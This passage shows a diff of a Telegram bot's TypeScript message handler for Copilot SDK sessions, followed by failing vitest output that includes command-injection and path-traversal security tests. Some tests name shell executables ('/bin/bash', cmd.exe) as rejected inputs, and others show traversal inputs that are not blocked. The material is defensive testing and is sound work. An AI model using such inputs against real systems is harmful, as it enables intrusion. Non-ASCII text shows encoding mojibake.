+               const totalExtensionsCount = autoExtensionCount + manualExtensions;

+               completionFooter += ` | Extensiones: ${totalExtensionsCount}`;

+             }

+             

+             completionFooter += '</i>';

+             safeParts[lastIndex] += completionFooter;

+           }

+           

+           const sendMessages = async () => {

+             if (msgId && safeParts.length > 0) {

+               try {

+                 await bot.api.editMessageText(chatId, msgId, safeParts[0], { parse_mode: 'HTML' });

+                 logger.debug('Final message updated successfully', {

+                   chatId,

+                   msgId,

+                   totalParts: safeParts.length,

+                   elapsedSeconds,

+                 });

+               } catch (error: any) {

+                 logger.warn('Failed to update final message, sending as new message', {

+                   chatId,

+                   msgId,

+                   error: error.message,

+                 });

+                 // Fallback: send as new message if edit fails

+                 try {

+                   await bot.api.sendMessage(chatId, safeParts[0], { parse_mode: 'HTML' });

+                 } catch (sendError: any) {

+                   logger.error('Failed to send first part as new message', {

+                     chatId,

+                     error: sendError.message,

+                   });

+                 }

+               }

+ 

+               for (let i = 1; i < safeParts.length; i += 1) {

+                 // Stop sending if cancelled

+                 if (isCancelled) break;

+                 try {

+                   await bot.api.sendMessage(chatId, safeParts[i], { parse_mode: 'HTML' });

+                   logger.debug('Additional message part sent', {

+                     chatId,

+                     partIndex: i,

+                   });

+                 } catch (error: any) {

+                   logger.warn('Failed to send message part', {

+                     chatId,

+                     partIndex: i,

+                     error: error.message,

+                   });

+                 }

+               }

+             }

+           };

+ 

+           const waitForProgress = lastProgressUpdate 

+             ? lastProgressUpdate.catch((error: any) => {

+                 logger.debug('Progress update did not complete before sending final message', {

+                   chatId,

+                   userId,

+                   error: error.message,

+                 });

+               })

+             : Promise.resolve();

+ 

+           waitForProgress

+             .then(() => sendMessages())

+             .then(() => {

+               sessionManager.clearTimeout(userId);

+               abortSignal?.removeEventListener('abort', onAbort);

+               unsubscribe();

+               resolve();

+             })

+             .catch((error) => {

+               sessionManager.clearTimeout(userId);

+               abortSignal?.removeEventListener('abort', onAbort);

+               unsubscribe();

+               reject(error);

+             });

+           break;

+         }

+         case 'session.error': {

+           isFinished = true;

+           if (heartbeatTimer) clearTimeout(heartbeatTimer);

+           if (autoExtensionTimer) clearInterval(autoExtensionTimer);

+           

+           const totalElapsedMs = Date.now() - startTime;

+           

+           // Log session.error event with error message and elapsed time

+           logger.error('SDK event: session.error', {

+             event: 'session.error',

+             chatId,

+             errorMessage: event.data.message,

+             elapsedMs,

+             elapsedSeconds: Math.floor(elapsedMs / ONE_SECOND_MS),

+           });

+           

+           // Log API call failure with performance metrics

+           logger.error('Copilot API call failed', {

+             chatId,

+             userId,

+             durationMs: totalElapsedMs,

+             durationSeconds: Math.floor(totalElapsedMs / ONE_SECOND_MS),

+             error: event.data.message,

+             success: false,

+           });

+ 

+           const waitForProgress = lastProgressUpdate 

+             ? lastProgressUpdate.catch((error: any) => {

+                 logger.debug('Progress update did not complete before sending error message', {

+                   chatId,

+                   userId,

+                   error: error.message,

+                 });

+               })

+             : Promise.resolve();

+ 

+           waitForProgress

+             .then(() => {

+               // Escape HTML to prevent issues if parse_mode is added in the future

+               const safeErrorMessage = sanitizeErrorForUser(event.data.message)

+                 .replace(/&/g, '&amp;')

+                 .replace(/</g, '&lt;')

+                 .replace(/>/g, '&gt;');

+               return bot.api.sendMessage(chatId, `Ã”Ã˜Ã® Error: ${safeErrorMessage}`, { parse_mode: 'HTML' });

+             })

+             .catch((error) => {

+               logger.error('Failed to send error notification to user', {

+                 chatId,

+                 error: error.message,

+               });

+             })

+             .finally(() => {

+               sessionManager.clearTimeout(userId);

+               abortSignal?.removeEventListener('abort', onAbort);

+               unsubscribe();

+               reject(event.data);

+             });

+           break;

+         }

+         default:

+           // Log any unknown/other events for visibility

+           logger.debug('SDK event: unknown event type', {

+             event: event.type,

+             chatId,

+             elapsedMs,

+             eventData: event.data ? JSON.stringify(event.data).substring(0, MAX_EVENT_DATA_PREVIEW_LENGTH) : undefined,

+           });

+           break;

+       }

+     });

+ 

+     session.send({ prompt }).catch((error) => {

+       sessionManager.clearTimeout(userId);

+       abortSignal?.removeEventListener('abort', onAbort);

+       unsubscribe();

+       reject(error);

+     });

+   });

+ }

+ 

+ // ============================================================================

+ // MESSAGE HANDLER REGISTRATION

+ // ============================================================================

+ 

+ export function registerMessageHandler(

+   bot: Bot,

+   sessionManager: SessionManager,

+   userState: UserState,

+   mcpRegistry: McpRegistry,

+   wizardManager: WizardManager,

+   allowlistWizard: AllowlistSetupWizard,

+   tools: ToolBundle

+ ) {

+   bot.on('message:text', async (ctx) => {

+     const text = ctx.message?.text;

+     if (!text || text.startsWith('/')) return;

+ 

+     const telegramIdStr = String(ctx.from?.id ?? '');

+     const telegramIdNum = ctx.from?.id;

+     if (!telegramIdNum) return; // Safety check

+     

+     const user = userState.getOrCreate(telegramIdStr, ctx.from?.username);

+ 

+     // Priority 1: Check if user is in allowlist setup wizard (use Telegram ID)

+     if (allowlistWizard.isInSetup(telegramIdNum)) {

+       logger.info('Allowlist wizard input received', sanitizeForLogging({

+         telegramId: telegramIdNum,

+         userId: user.id,

+         input: text,

+       }));

+ 

+       await allowlistWizard.handleInput(ctx, text, telegramIdNum);

+       return;

+     }

+ 

+     // Priority 2: Check if user needs allowlist setup (use Telegram ID)

+     if (needsAllowlistSetup && allowlistWizard.needsSetup(telegramIdNum)) {

+       logger.info('User needs allowlist setup, starting wizard', {

+         telegramId: telegramIdNum,

+         userId: user.id,

+       });

+ 

+       await allowlistWizard.startSetup(ctx);

+       return;

+     }

+ 

+     // Priority 3: Check if user has an active wizard session (MCP wizard)

+     if (wizardManager.hasActiveWizard(user.id)) {

+       logger.info('Wizard input received', sanitizeForLogging({

+         telegramId: telegramIdNum,

+         username: ctx.from?.username,

+         input: text,

+       }));

+ 

+       const result = wizardManager.handleInput(user.id, text);

+       if (result) {

+         await ctx.reply(result.message, { parse_mode: 'HTML' });

+ 

+         // If wizard completed successfully, reload MCP registry and recreate session

+         if (result.complete && result.success) {

+           if (sessionManager.isBusy(telegramIdStr)) {

+             await ctx.reply('Ã”Ã…â”‚ Espera un momento mientras actualizo la configuraciâ”œâ”‚n...');

+             return;

+           }

+           

+           sessionManager.setBusy(telegramIdStr, true);

+           try {

+             mcpRegistry.load(); // Reload from database

+             await sessionManager.recreateActiveSession(telegramIdStr, {

+               model: userState.getCurrentModel(user.id),

+               tools: tools.all,

+               mcpServers: mcpRegistry.getEnabled(),

+             });

+             await ctx.reply('Ã”Â£Ã  Configuraciâ”œâ”‚n actualizada. El nuevo servidor estâ”œÃ­ disponible.');

+           } catch (error: any) {

+             logger.error('Error updating session after wizard completion', { error });

+             await ctx.reply(`Ã”ÃœÃ¡Â´Â©Ã… Servidor creado pero hubo un error al actualizar la sesiâ”œâ”‚n: ${sanitizeErrorForUser(error)}`);

+           } finally {

+             sessionManager.setBusy(telegramIdStr, false);

+           }

+         }

+       }

+       return;

+     }

+ 

+     if (tools.askUser.hasPending()) {

+       const resolved = tools.askUser.resolveResponse(text);

+       if (resolved) return;

+     }

+     

+     logger.info('User message received', sanitizeForLogging({

+       telegramId: telegramIdNum,

+       username: ctx.from?.username,

+       messageLength: text.length,

+       message: text,

+     }));

+     

+     // Validate and truncate message if needed

+     const validation = await validateMessageSize(text, ctx);

+     const validatedText = validation.text;

+     

+     if (sessionManager.isBusy(telegramIdStr)) {

+       await ctx.reply('Ã”Ã…â”‚ Ya hay una operaciâ”œâ”‚n en curso. Espera un momento.');

+       return;

+     }

+     sessionManager.setBusy(telegramIdStr, true);

+     const cwd = userState.getCurrentCwd(user.id);

+     const model = userState.getCurrentModel(user.id);

+     

+     // CRITICAL SECURITY: Validate cwd is in allowlist BEFORE creating session

+     // This prevents bypass when user has allowed_paths_configured=1 in DB

+     // but admin cleared ALLOWED_PATHS from .env

+     if (!isPathAllowed(cwd)) {

+       logger.warn('Blocked session creation - cwd not in allowlist', {

+         telegramId: telegramIdNum,

+         userId: user.id,

+         cwd,

+         needsAllowlistSetup,

+       });

+       sessionManager.setBusy(telegramIdStr, false);

+       await ctx.reply(

+         'Ã”ÃœÃ¡Â´Â©Ã… <b>Acceso Denegado</b>\n\n' +

+         'El directorio actual no estâ”œÃ­ en la lista de rutas permitidas.\n\n' +

+         'Posibles causas:\n' +

+         'Ã”Ã‡Ã³ El administrador ha modificado la configuraciâ”œâ”‚n de seguridad\n' +

+         'Ã”Ã‡Ã³ El directorio fue removido de la lista permitida\n\n' +

+         'Por favor, contacta al administrador del bot o usa /cd para cambiar a un directorio permitido.',

+         { parse_mode: 'HTML' }

+       );

+       return;

+     }

+     

+     // Clear any previous cancellation flags

+     sessionManager.clearCancelled(telegramIdStr, cwd);

+     

+     try {

+       const controller = new AbortController();

+       sessionManager.registerAborter(telegramIdStr, () => controller.abort());

+       

+       // Check if plan mode is active to preserve context

+       const isPlanMode = sessionManager.isPlanModeActive(telegramIdStr);

+       const switchOptions: any = {

+         model,

+         tools: tools.all,

+         mcpServers: mcpRegistry.getEnabled(),

+       };

+       

+       // If plan mode is active, include systemMessage to maintain plan context

+       if (isPlanMode) {

+         switchOptions.systemMessage = { content: PLAN_MODE_SYSTEM_MESSAGE };

+         logger.info('Recreating session with plan mode context', {

+           telegramId: telegramIdNum,

+           projectPath: cwd,

+         });

+       }

+       

+       const session = await sessionManager.switchProject(telegramIdStr, cwd, switchOptions);

+       await sendPromptWithStreaming(ctx, session, validatedText, bot, sessionManager, telegramIdStr, controller.signal);

+     } catch (error: any) {

+       logger.error('Error during streaming', {

+         telegramId: telegramIdNum,

+         error: error.message,

+       });

+       

+       // Don't send message if cancelled - /stop already sent feedback

+       if (!sessionManager.isCancelled(telegramIdStr, cwd)) {

+         await ctx.reply(`Ã”Ã˜Ã® ${sanitizeErrorForUser(error)}`).catch((telegramError: any) => {

+           logger.warn('Failed to send error message to user', {

+             chatId: ctx.chat?.id,

+             userId: telegramIdNum,

+             error: telegramError.message,

+           });

+         });

+       }

+     } finally {

+       sessionManager.clearAborter(telegramIdStr);

+       sessionManager.clearCancelled(telegramIdStr, cwd);

+       sessionManager.setBusy(telegramIdStr, false);

+     }

+   });

+ }

+ 

+ export { sendPromptWithStreaming };

+

 Ã”Ã˜Â» tests/race-condition-fix.test.ts:25:37
     23|   describe('Mutex Infrastructure', () => {
     24|     it('should have timeoutExtensionLocks Map declared', () => {
     25|       expect(messageHandlerContent).toContain('timeoutExtensionLocks');
       |                                     ^
     26|       expect(messageHandlerContent).toMatch(/new Map<string,\s*booleanÃ”Ã‡Âª
     27|     });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[81/182]Ã”Ã„Â»

 FAIL  tests/race-condition-fix.test.ts > Race Condition Fix - Timeout Extension Mutex > Mutex Infrastructure > should check if lock is already held before acquiring
AssertionError: expected 'function acquireExtensionLock(userId:Ã”Ã‡Âª' to match /timeoutExtensionLocks\.get\(userId\)/

- Expected: 
/timeoutExtensionLocks\.get\(userId\)/

+ Received: 
"function acquireExtensionLock(userId: string, operationType: 'auto' | 'manual'): boolean {
  const acquired = timeoutExtensionLock.tryAcquire(userId);
  
  if (!acquired) {
    logger.debug('Extension lock already held, skipping operation', {
      userId,
      operationType,
      lockStatus: 'already_locked',
    });
    return false;
  }
  
  logger.debug('Extension lock acquired', {
    userId,
    operationType,
    lockStatus: 'acquired',
  });
  return true;
}"

 Ã”Ã˜Â» tests/race-condition-fix.test.ts:49:25
     47|       const acquireFn = acquireFnMatch![0];
     48|       
     49|       expect(acquireFn).toMatch(/timeoutExtensionLocks\.get\(userId\)/Ã”Ã‡Âª
       |                         ^
     50|       expect(acquireFn).toContain('return false');
     51|     });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[82/182]Ã”Ã„Â»

 FAIL  tests/race-condition-fix.test.ts > Race Condition Fix - Timeout Extension Mutex > Mutex Infrastructure > should delete lock in releaseExtensionLock
AssertionError: expected 'function releaseExtensionLock(userId:Ã”Ã‡Âª' to contain 'timeoutExtensionLocks.delete(userId)'

- Expected
+ Received

- timeoutExtensionLocks.delete(userId)
+ function releaseExtensionLock(userId: string, operationType: 'auto' | 'manual'): void {

+   timeoutExtensionLock.release(userId);

+   logger.debug('Extension lock released', {

+     userId,

+     operationType,

+     lockStatus: 'released',

+   });

+ }

 Ã”Ã˜Â» tests/race-condition-fix.test.ts:60:25
     58|       const releaseFn = releaseFnMatch![0];
     59|       
     60|       expect(releaseFn).toContain('timeoutExtensionLocks.delete(userIdÃ”Ã‡Âª
       |                         ^
     61|     });
     62|   });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[83/182]Ã”Ã„Â»

 FAIL  tests/sanitize.test.ts > sanitizeForLogging > should handle null and undefined values
AssertionError: expected null to be undefined // Object.is equality

- Expected: 
undefined

+ Received: 
null

 Ã”Ã˜Â» tests/sanitize.test.ts:111:35
    109|     const result = sanitizeForLogging(input);
    110|     expect(result.nullValue).toBe(null);
    111|     expect(result.undefinedValue).toBe(undefined);
       |                                   ^
    112|     expect(result.token).toBe('[REDACTED]');
    113|   });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[84/182]Ã”Ã„Â»

 FAIL  tests/sdk-event-logging.test.ts > SDK Event Logging > should log stale period warning when no events for >2 minutes
AssertionError: expected "spy" to be called with arguments: [ Ã”Ã‡Âª(2) ]

Received: 



Number of calls: 0

 Ã”Ã˜Â» tests/sdk-event-logging.test.ts:344:27
    342|     
    343|     // Verify that stale warning was logged
    344|     expect(loggerWarnSpy).toHaveBeenCalledWith(
       |                           ^
    345|       'Stale period detected - no events received',
    346|       expect.objectContaining({

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[85/182]Ã”Ã„Â»

 FAIL  tests/security-command-injection.test.ts > Command Injection Security Tests > Executables Outside Allowlist > should reject executable with full path outside allowlist
AssertionError: expected 'Ã”Ã˜Ã® La ruta absoluta \'/bin/bash\' no eÃ”Ã‡Âª' to contain 'no permitido'

Expected: "no permitido"
Received: "Ã”Ã˜Ã® La ruta absoluta '/bin/bash' no estâ”œÃ­ en el PATH del sistema. Solo se permiten rutas absolutas que apunten a ejecutables del sistema."

 Ã”Ã˜Â» tests/security-command-injection.test.ts:341:28
    339| 
    340|       expect(result.success).toBe(false);
    341|       expect(result.error).toContain('no permitido');
       |                            ^
    342|     });
    343| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[86/182]Ã”Ã„Â»

 FAIL  tests/security-command-injection.test.ts > Command Injection Security Tests > Path Traversal in Executable Path > should reject command with absolute path to system binary
AssertionError: expected 'Ã”Ã˜Ã® La ruta absoluta \'C:\Windows\SysteÃ”Ã‡Âª' to contain 'no permitido'

Expected: "no permitido"
Received: "Ã”Ã˜Ã® La ruta absoluta 'C:\Windows\System32\cmd.exe' no estâ”œÃ­ en el PATH del sistema. Solo se permiten rutas absolutas que apunten a ejecutables del sistema."

 Ã”Ã˜Â» tests/security-command-injection.test.ts:383:28
    381| 
    382|       expect(result.success).toBe(false);
    383|       expect(result.error).toContain('no permitido');
       |                            ^
    384|     });
    385| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[87/182]Ã”Ã„Â»

 FAIL  tests/security-command-injection.test.ts > Command Injection Security Tests > Path Traversal in Executable Path > should extract basename correctly from full path
AssertionError: expected false to be true // Object.is equality

- Expected
+ Received

- true
+ false

 Ã”Ã˜Â» tests/security-command-injection.test.ts:396:30
    394| 
    395|       // Should succeed because basename 'node' is in allowlist
    396|       expect(result.success).toBe(true);
       |                              ^
    397|     });
    398| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[88/182]Ã”Ã„Â»

 FAIL  tests/security-command-injection.test.ts > Command Injection Security Tests > Path Traversal in Executable Path > should handle Windows paths correctly
AssertionError: expected false to be true // Object.is equality

- Expected
+ Received

- true
+ false

 Ã”Ã˜Â» tests/security-command-injection.test.ts:409:32
    407| 
    408|         // Should succeed because basename 'node.exe' is in allowlist
    409|         expect(result.success).toBe(true);
       |                                ^
    410|       });
    411|     }

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[89/182]Ã”Ã„Â»

 FAIL  tests/security-command-injection.test.ts > Command Injection Security Tests > Edge Cases and Fuzzing > should handle mixed case and variations
AssertionError: expected false to be true // Object.is equality

- Expected
+ Received

- true
+ false

 Ã”Ã˜Â» tests/security-command-injection.test.ts:705:34
    703|           });
    704| 
    705|           expect(result.success).toBe(true);
       |                                  ^
    706|         });
    707|       }
 Ã”Ã˜Â» tests/security-command-injection.test.ts:697:20

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[90/182]Ã”Ã„Â»

 FAIL  tests/security-command-injection.test.ts > Command Injection Security Tests > HTTP Server Security > should accept valid http URL
AssertionError: expected false to be true // Object.is equality

- Expected
+ Received

- true
+ false

 Ã”Ã˜Â» tests/security-command-injection.test.ts:719:30
    717|       });
    718| 
    719|       expect(result.success).toBe(true);
       |                              ^
    720|     });
    721| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[91/182]Ã”Ã„Â»

 FAIL  tests/security-fixes.test.ts > Security and Architecture Fixes > Fix #5: URL Protocol Validation > should accept valid http URLs
AssertionError: expected false to be true // Object.is equality

- Expected
+ Received

- true
+ false

 Ã”Ã˜Â» tests/security-fixes.test.ts:62:30
     60|       });
     61| 
     62|       expect(result.success).toBe(true);
       |                              ^
     63|     });
     64| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[92/182]Ã”Ã„Â»

 FAIL  tests/security-integration.test.ts > Security Fixes Integration Tests > should handle all security scenarios in end-to-end flow
AssertionError: expected undefined not to be undefined
 Ã”Ã˜Â» tests/security-integration.test.ts:194:20
    192|     
    193|     let server = service.getServer('e2e-stdio');
    194|     expect(server).toBeDefined();
       |                    ^
    195|     expect(server?.config.args).toContain('--port');
    196|     expect(server?.config.args).toContain('8080');

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[93/182]Ã”Ã„Â»

 FAIL  tests/security-path-traversal.test.ts > Path Traversal Security Tests > Path Traversal Attacks > should block path traversal with URL encoding
AssertionError: expected true to be false // Object.is equality

- Expected
+ Received

- false
+ true

 Ã”Ã˜Â» tests/security-path-traversal.test.ts:113:22
    111|       const result = isPathAllowed(encodedPath);
    112|       
    113|       expect(result).toBe(false);
       |                      ^
    114|     });
    115| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[94/182]Ã”Ã„Â»

 FAIL  tests/security-path-traversal.test.ts > Path Traversal Security Tests > Path Traversal Attacks > should block Unicode path traversal attempts
AssertionError: expected true to be false // Object.is equality

- Expected
+ Received

- false
+ true

 Ã”Ã˜Â» tests/security-path-traversal.test.ts:130:22
    128|       const result = isPathAllowed(unicodeDots);
    129|       
    130|       expect(result).toBe(false);
       |                      ^
    131|     });
    132|   });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[95/182]Ã”Ã„Â»

 FAIL  tests/timeout-confirmation.test.ts > Interactive Timeout Confirmation > Callback Handler Registration > should register callback handler for timeout responses
AssertionError: expected undefined not to be undefined
 Ã”Ã˜Â» tests/timeout-confirmation.test.ts:281:30
    279|       );
    280| 
    281|       expect(timeoutHandler).toBeDefined();
       |                              ^
    282|     });
    283| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[96/182]Ã”Ã„Â»

 FAIL  tests/timeout-confirmation.test.ts > Interactive Timeout Confirmation > Callback Handler Registration > should handle callback query for extend action
AssertionError: expected undefined not to be undefined
 Ã”Ã˜Â» tests/timeout-confirmation.test.ts:302:23
    300|       )?.handler;
    301| 
    302|       expect(handler).toBeDefined();
       |                       ^
    303| 
    304|       // Mock context

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[97/182]Ã”Ã„Â»

 FAIL  tests/timeout-extension.test.ts > SessionManager - Timeout Extension > Critical Bug Fix: Manual Extension Timeout Reset > should use Math.max(0, ...) to prevent negative remaining time
AssertionError: expected true to be false // Object.is equality

- Expected
+ Received

- false
+ true

 Ã”Ã˜Â» tests/timeout-extension.test.ts:408:24
    406|       // This should fail because user is no longer busy after timeout
    407|       const extended = manager.extendTimeout(userId, 30000);
    408|       expect(extended).toBe(false);
       |                        ^
    409|     });
    410| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[98/182]Ã”Ã„Â»

 FAIL  tests/tools-ask-user.test.ts > ask_telegram_user tool > token matching > should accept response from correct user with matching token
AssertionError: expected false to be true // Object.is equality

- Expected
+ Received

- true
+ false

 Ã”Ã˜Â» tests/tools-ask-user.test.ts:67:24
     65|       // Resolve with correct token
     66|       const resolved = resolveResponse('Sâ”œÂ¡', token);
     67|       expect(resolved).toBe(true);
       |                        ^
     68|       
     69|       // Advance timers to allow promise resolution

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[99/182]Ã”Ã„Â»

 FAIL  tests/tools-ask-user.test.ts > ask_telegram_user tool > token matching > should accept response without token verification when token not required
AssertionError: expected false to be true // Object.is equality

- Expected
+ Received

- true
+ false

 Ã”Ã˜Â» tests/tools-ask-user.test.ts:118:24
    116|       // Resolve without token (backward compatibility)
    117|       const resolved = resolveResponse('Juan');
    118|       expect(resolved).toBe(true);
       |                        ^
    119|       
    120|       await vi.runAllTimersAsync();

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[100/182]Ã”Ã„Â»

 FAIL  tests/tools-ask-user.test.ts > ask_telegram_user tool > timeout handling > should cleanup state on timeout
AssertionError: expected false to be true // Object.is equality

- Expected
+ Received

- true
+ false

 Ã”Ã˜Â» tests/tools-ask-user.test.ts:162:28
    160|       
    161|       // Verify pending state
    162|       expect(hasPending()).toBe(true);
       |                            ^
    163|       
    164|       // Timeout

